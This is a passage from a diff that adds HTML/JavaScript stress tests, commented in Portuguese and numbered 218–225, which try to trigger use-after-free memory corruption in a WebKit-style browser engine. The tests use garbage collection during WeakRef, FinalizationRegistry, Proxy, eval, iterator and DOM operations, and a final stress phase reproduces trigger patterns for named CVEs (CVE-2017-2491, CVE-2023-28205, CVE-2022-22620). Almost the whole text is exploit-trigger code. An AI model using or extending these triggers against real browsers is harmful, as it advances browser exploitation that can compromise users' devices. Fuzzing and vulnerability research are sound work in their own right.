+    try { document.body.removeChild(iframe); } catch(e){}
+    gcHeavy(); // GC pesado pos-remocao do iframe
+
+    // Navegacao no historico principal apos remocao do iframe
+    for(let i = 0; i < 5; i++){
+      try { history.back(); }    catch(e){}
+      try { history.forward(); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 217: fim');
+}
+
+// T218 — WeakRef.deref() com objeto coletado + acesso pos-GC
+// WeakRef permite referencia fraca — o objeto PODE ser coletado a qualquer momento.
+// Deref retorna undefined se coletado; mas em implementacoes bugadas pode retornar stale ptr.
+function t218(){
+  log('Teste 218: inicio');
+  try {
+    // Criar objeto grande e fazer WeakRef
+    let strongRef = {
+      id: 'weak_target',
+      data: new Float64Array(1024),
+      nested: { buf: new ArrayBuffer(65536) }
+    };
+    const wr = new WeakRef(strongRef);
+
+    // Soltar a unica referencia forte
+    strongRef = null;
+    gc();      // GC: objeto DEVE ser coletado agora
+    gcHeavy(); // GC pesado para garantir coleta
+
+    // Deref apos GC — deve retornar undefined
+    const derefed = wr.deref();
+    if(derefed !== undefined){
+      // Objeto ainda vivo — tentar criar condicao de stale ptr
+      try { derefed.data[0] = 0xDEAD; }      catch(e){}
+      try { derefed.nested.buf.byteLength; }  catch(e){}
+    }
+
+    // Criar muitos WeakRefs e coletar todos
+    const wrs = [];
+    for(let i = 0; i < 500; i++){
+      let obj = { id: i, buf: new Uint8Array(256) };
+      wrs.push(new WeakRef(obj));
+      obj = null; // nenhuma referencia forte
+    }
+    gc();
+    gcHeavy();
+
+    // Tentar deref todos pos-GC
+    for(let w of wrs){
+      try {
+        const d = w.deref();
+        if(d) d.buf[0] = 0xFF;
+      } catch(e){}
+    }
+
+    // WeakRef de objeto no prototype chain
+    let protoObj = { sharedMethod: function(){ return 42; } };
+    const protoWR = new WeakRef(protoObj);
+    const child = Object.create(protoObj);
+    protoObj = null;
+    gc();
+    try {
+      const dp = protoWR.deref();
+      if(dp) child.sharedMethod(); // pode usar proto coletado
+    } catch(e){}
+  } catch(e){}
+  log('Teste 218: fim');
+}
+
+// T219 — FinalizationRegistry: callback chamado com ponteiro para objeto coletado
+// O callback do FinalizationRegistry e chamado apos o GC coletar o objeto registrado;
+// o valor 'heldValue' pode ele mesmo ser um objeto que sera coletado.
+function t219(){
+  log('Teste 219: inicio');
+  try {
+    let callbackHeldValues = [];
+    let callbackCount = 0;
+
+    const registry = new FinalizationRegistry(function(heldVal){
+      callbackCount++;
+      // O heldVal pode ser outro objeto que tambem foi coletado
+      try {
+        callbackHeldValues.push(heldVal);
+        if(heldVal && typeof heldVal === 'object'){
+          heldVal.accessed = true; // modificar objeto pos-finalizacao
+          let len = heldVal.data ? heldVal.data.length : 0;
+        }
+      } catch(e){}
+    });
+
+    // Registrar objetos com heldValues que tambem serao coletados
+    for(let i = 0; i < 100; i++){
+      let target = { id: i, data: new Uint8Array(64) };
+      let held = { ref: target, extra: new Float64Array(32) }; // held aponta para target
+      registry.register(target, held, target);
+      target = null;
+      held = null; // soltar ambos — ambos podem ser coletados
+    }
+
+    gc();
+    gcHeavy();
+
+    // Esperar callbacks (async — podem nao ter rodado ainda)
+    // Tentar usar os heldValues que foram passados para os callbacks
+    for(let hv of callbackHeldValues){
+      try {
+        if(hv && hv.ref) hv.ref.id; // stale pointer para objeto coletado
+        if(hv && hv.extra) hv.extra[0] = 0xBEEF;
+      } catch(e){}
+    }
+
+    // Unregister com token antes do GC — race condition
+    let liveTarget = { alive: true, data: new ArrayBuffer(1024) };
+    let liveHeld = { live: true };
+    registry.register(liveTarget, liveHeld, liveTarget);
+    // Unregister e depois coletar
+    registry.unregister(liveTarget);
+    liveTarget = null;
+    gc();
+  } catch(e){}
+  log('Teste 219: fim');
+}
+
+// T220 — Array.from com iteravel customizado + GC durante coleta
+// Array.from chama o iterador em C++; GC durante a coleta pode liberar
+// objetos que o iterador retornou mas que ainda estao sendo processados.
+function t220(){
+  log('Teste 220: inicio');
+  try {
+    let iterObjects = [];
+    for(let i = 0; i < 500; i++){
+      iterObjects.push({ id: i, data: new Uint8Array(32) });
+    }
+
+    let step = 0;
+    const evilIter = {
+      [Symbol.iterator]: function(){
+        step = 0;
+        return {
+          next: function(){
+            step++;
+            if(step > 500) return { done: true };
+            if(step === 250){
+              iterObjects = []; // soltar referencias
+              gc();             // GC: objetos ja retornados pelo iterador podem ser liberados
+            }
+            return { value: { id: step, data: new Uint8Array(16) }, done: false };
+          }
+        };
+      }
+    };
+
+    try { Array.from(evilIter); } catch(e){}
+
+    // Array.from com map function que faz GC
+    const src = new Array(100).fill(null).map(function(_, i){ return { id: i }; });
+    try {
+      Array.from(src, function(item){
+        gc();
+        return item ? item.id : -1;
+      });
+    } catch(e){}
+
+    // Array.from de TypedArray grande
+    try {
+      const bigTA = new Float64Array(1000000);
+      for(let i = 0; i < 1000000; i++) bigTA[i] = i * 0.1;
+      gc();
+      Array.from(bigTA); // cria array JS de 1M elementos
+    } catch(e){}
+
+    // Array.from com iteravel que lanca no meio
+    let fromStep = 0;
+    try {
+      Array.from({
+        [Symbol.iterator]: function(){
+          return {
+            next: function(){
+              fromStep++;
+              if(fromStep === 50) throw new TypeError('iter_throws_in_Array_from');
+              if(fromStep > 100) return { done: true };
+              return { value: fromStep, done: false };
+            }
+          };
+        }
+      });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 220: fim');
+}
+
+// T221 — Proxy com get trap que triggera GC + acesso ao objeto original
+// O Proxy intercepta get; se o trap faz GC e o objeto alvo fica sem referencias,
+// o acesso subsequente ao alvo e um UAF.
+function t221(){
+  log('Teste 221: inicio');
+  try {
+    let target = {
+      data: new Float64Array(512),
+      nested: { buf: new ArrayBuffer(65536) },
+      id: 'proxy_target'
+    };
+
+    const handler = {
+      get: function(t, key, receiver){
+        if(key === 'gcTrigger'){
+          gc(); // GC no meio de acesso via Proxy
+          return t[key];
+        }
+        return Reflect.get(t, key, receiver);
+      },
+      set: function(t, key, value, receiver){
+        gc();
+        return Reflect.set(t, key, value, receiver);
+      }
+    };
+
+    const p = new Proxy(target, handler);
+
+    // Acessar via proxy antes de soltar target
+    try { p.data[0] = 1.5; }      catch(e){}
+    try { p.gcTrigger; }           catch(e){}
+
+    // Soltar referencia ao target — GC pode coletar
+    target = null;
+    gc();
+
+    // Acessar via proxy apos GC do target
+    try { p.data; }                catch(e){}
+    try { p.nested.buf.byteLength; } catch(e){}
+    try { p.id; }                  catch(e){}
+    try { p.gcTrigger; }           catch(e){}
+
+    // Proxy de Array com get que faz GC + acesso OOB
+    let arrTarget = new Array(100).fill(0).map(function(_, i){ return i * 1.5; });
+    const arrProxy = new Proxy(arrTarget, {
+      get: function(t, k){
+        if(k === 'length'){ gc(); return t.length; }
+        return t[k];
+      }
+    });
+    arrTarget = null;
+    gc();
+    try { for(let v of arrProxy){} }           catch(e){}
+    try { arrProxy.sort(function(a,b){ return a-b; }); } catch(e){}
+  } catch(e){}
+  log('Teste 221: fim');
+}
+
+// T222 — eval com escopo profundo + GC (bytecode compiler + LLInt)
+// eval dentro de closures aninhadas cria escopo chain complexo;
+// GC durante eval pode liberar objetos do escopo externo que o eval ainda referencia.
+function t222(){
+  log('Teste 222: inicio');
+  try {
+    // Criar closures aninhadas com dados no heap
+    function makeNested(depth, data){
+      if(depth <= 0){
+        return function(){
+          // eval mais interno — acessa variaveis de todos os escopos acima
+          return eval('data.length + depth');
+        };
+      }
+      const localData = new Uint8Array(64);
+      const localObj = { depth: depth, buf: new ArrayBuffer(256) };
+      return makeNested(depth - 1, localData);
+    }
+
+    const innerFn = makeNested(20, new Uint8Array(128));
+    gc(); // GC com closures aninhadas — dados dos escopos intermediarios podem ser liberados
+    try { innerFn(); } catch(e){}
+
+    // eval que cria funcoes + GC entre criacoes
+    const evals = [];
+    for(let i = 0; i < 50; i++){
+      try {
+        const fn = eval('(function evalFn_' + i + '(x){ return x * ' + i + '; })');
+        evals.push(fn);
+        if(i % 10 === 0) gc();
+      } catch(e){}
+    }
+
+    // Chamar funcoes criadas via eval apos GC
+    gc();
+    for(let fn of evals){
+      try { fn(42); } catch(e){}
+    }
+
+    // eval com codigo que referencia objeto que pode ser coletado
+    let evalTarget = { value: 99, data: new Float64Array(128) };
+    const capturer = (function(){
+      const local = evalTarget;
+      evalTarget = null;
+      return function(){
+        gc(); // GC: local pode ser coletado se GC nao ve a closure corretamente
+        return eval('local.value + local.data[0]');
+      };
+    })();
+    try { capturer(); } catch(e){}
+  } catch(e){}
+  log('Teste 222: fim');
+}
+
+// T223 — arguments object + GC em funcao chamada com muitos args (LLInt)
+// O objeto 'arguments' em LLInt e criado no frame; GC pode invalidar o frame
+// se a funcao e chamada via apply com array que e coletado.
+function t223(){
+  log('Teste 223: inicio');
+  try {
+    function useArgs(){
+      gc(); // GC dentro da funcao com arguments no frame
+      let sum = 0;
+      for(let i = 0; i < arguments.length; i++){
+        try { sum += arguments[i]; } catch(e){}
+      }
+      return sum;
+    }
+
+    // Criar array de argumentos e coletar antes do apply
+    let argArr = new Array(1000).fill(0).map(function(_, i){ return { val: i }; });
+    try { useArgs.apply(null, argArr); } catch(e){}
+
+    // Tentar coletar argArr durante o apply
+    argArr = null;
+    gc();
+
+    // Chamar com muitos argumentos de tipos mistos
+    const mixedArgs = [
+      1, 'two', { three: 3 }, null, undefined, Symbol('five'),
+      new ArrayBuffer(64), new Uint8Array(32), true, false, NaN, Infinity
+    ];
+    try { useArgs.apply(null, mixedArgs); } catch(e){}
+
+    // Funcao variadic via rest parameters + GC
+    function restFn(...args){
+      gc(); // GC com rest array na stack
+      return args.reduce(function(s, v){ return s + (v || 0); }, 0);
+    }
+    let restArgs = new Array(500).fill(0).map(function(_, i){ return i * 0.1; });
+    try { restFn.apply(null, restArgs); } catch(e){}
+    restArgs = null;
+    gc();
+
+    // Overflow de call stack via recursao LLInt
+    function recurse(n){
+      if(n <= 0) return 0;
+      return recurse(n - 1) + 1;
+    }
+    try { recurse(100000); } catch(e){} // stack overflow no LLInt
+  } catch(e){}
+  log('Teste 223: fim');
+}
+
+// T224 — Symbol.iterator + GC durante iteracao (for-of no LLInt)
+// for-of usa o protocolo de iterador; o iterador e um objeto no heap;
+// GC durante next() pode liberar o iterador ou seus resultados.
+function t224(){
+  log('Teste 224: inicio');
+  try {
+    // Iterador customizado com GC em next()
+    let iterData = new Array(200).fill(0).map(function(_, i){
+      return { id: i, buf: new Uint8Array(32) };
+    });
+
+    const customIter = {
+      [Symbol.iterator]: function(){
+        let idx = 0;
+        return {
+          next: function(){
+            idx++;
+            if(idx % 30 === 0){
+              iterData = iterData.filter(function(x){ return x.id > idx; }); // mutar dados
+              gc(); // GC no meio da iteracao
+            }
+            if(idx > 200) return { value: undefined, done: true };
+            return { value: iterData[idx % Math.max(1, iterData.length)], done: false };
+          },
+          return: function(){ gc(); return { done: true }; }
+        };
+      }
+    };
+
+    try {
+      for(let item of customIter){
+        if(item) item.buf[0] = 0xFF;
+      }
+    } catch(e){}
+
+    // String iterator com GC
+    const longStr = 'abcdefghij'.repeat(1000);
+    let strIdx = 0;
+    try {
+      for(let ch of longStr){
+        strIdx++;
+        if(strIdx % 500 === 0) gc();
+      }
+    } catch(e){}
+
+    // Map/Set iterator + GC durante iteracao
+    const bigMap = new Map();
+    for(let i = 0; i < 500; i++) bigMap.set({ key: i }, { val: i, data: new Uint8Array(8) });
+
+    let mapIdx = 0;
+    try {
+      for(let [k, v] of bigMap){
+        mapIdx++;
+        if(mapIdx === 100){
+          bigMap.clear(); // limpar map durante iteracao
+          gc();
+        }
+        if(v) v.data[0] = mapIdx;
+      }
+    } catch(e){}
+
+    // destructuring + GC
+    let arr224 = [[1, new Uint8Array(32)], [2, new Float64Array(16)], [3, new ArrayBuffer(64)]];
+    try {
+      for(let [a, b] of arr224){
+        gc();
+        if(b && b.byteLength !== undefined) b.byteLength;
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 224: fim');
+}
+
+// T225 — STRESS FINAL: combinacao de todos os vetores LLInt validos
+// replace+GC + sort+GC + for-in+proto + structuredClone + DOM removal
+// Tudo em sequencia rapida com GC pesado para maximizar janela de UAF
+function t225(){
+  log('Teste 225: inicio');
+  try {
+    const area = document.getElementById('dom-area');
+
+    // === FASE 1: String.replace + GC (CVE-2017-2491) ===
+    const re1 = /\w+/g;
+    let strs1 = new Array(300).fill(0).map(function(_, i){ return 'str_' + i; });
+    let rep1N = 0;
+    try {
+      'hello world foo bar baz'.replace(re1, function(match, offset, str){
+        rep1N++;
+        if(rep1N === 3){ strs1 = null; gc(); }
+        return match.toUpperCase();
+      });
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 2: Array.sort + GC (UAF classico LLInt) ===
+    const arr2 = new Array(100).fill(0).map(function(_, i){
+      return { v: Math.random(), buf: new Uint8Array(64) };
+    });
+    let sortN = 0;
+    try {
+      arr2.sort(function(a, b){
+        sortN++;
+        if(sortN === 30) gc();
+        return a.v - b.v;
+      });
+    } catch(e){}
+
+    gc();
+
+    // === FASE 3: for-in + __proto__ mutation + GC (JSPropertyNameEnumerator UAF) ===
+    for(let i = 0; i < 20; i++){
+      try {
+        const o = { a: 1, b: 2, c: 3, d: 4 };
+        for(let k in o){
+          o.__proto__ = { injected: true };
+          gc();
+        }
+      } catch(e){}
+    }
+
+    gcHeavy();
+
+    // === FASE 4: structuredClone + GC (CVE-2023-28205) ===
+    let deepData = {
+      maps: [new Map([[1,2],[3,new Map([[5,6]])]]), new Map([[7, new Set([8,9])]])],
+      sets: [new Set([new Map([[10,11]]), 12]), new Set([13, 14])],
+      arr: new Array(100).fill(0).map(function(_, i){ return { id: i }; })
+    };
+    let phase4N = 0;
+    const evilObj4 = {
+      get poison(){
+        phase4N++;
+        if(phase4N === 1){ deepData = null; gc(); }
+        return 42;
+      }
+    };
+    deepData = { data: deepData, evil: evilObj4 };
+    try { structuredClone(deepData); } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 5: DOM removal + GC (WebCore UAF) ===
+    if(area){
+      const nodes5 = [];
+      for(let i = 0; i < 30; i++){
+        const el = document.createElement('div');
+        el.textContent = 'stress_' + i;
+        area.appendChild(el);
+        nodes5.push(el);
+      }
+      gc();
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      gcHeavy();
+      for(let n of nodes5){
+        try { n.textContent = 'post_gc_' + n.textContent; } catch(e){}
+        try { n.getBoundingClientRect(); }                   catch(e){}
+      }
+    }
+
+    // === FASE 6: History UAF (CVE-2022-22620) ===
+    for(let i = 0; i < 20; i++){
+      try {
+        history.pushState(
+          { i: i, d: new ArrayBuffer(512), arr: new Array(50).fill(i) },
+          '',
+          '#stress_' + i
+        );
+      } catch(e){}
+    }
+    gc();
+    for(let i = 0; i < 10; i++){
+      try { history.go(-2); }      catch(e){}
+      gcHeavy();
+      try { history.go(1); }       catch(e){}
+    }
+  } catch(e){}
+  log('Teste 225: fim');
+}
+</script>
+</body>
+</html>
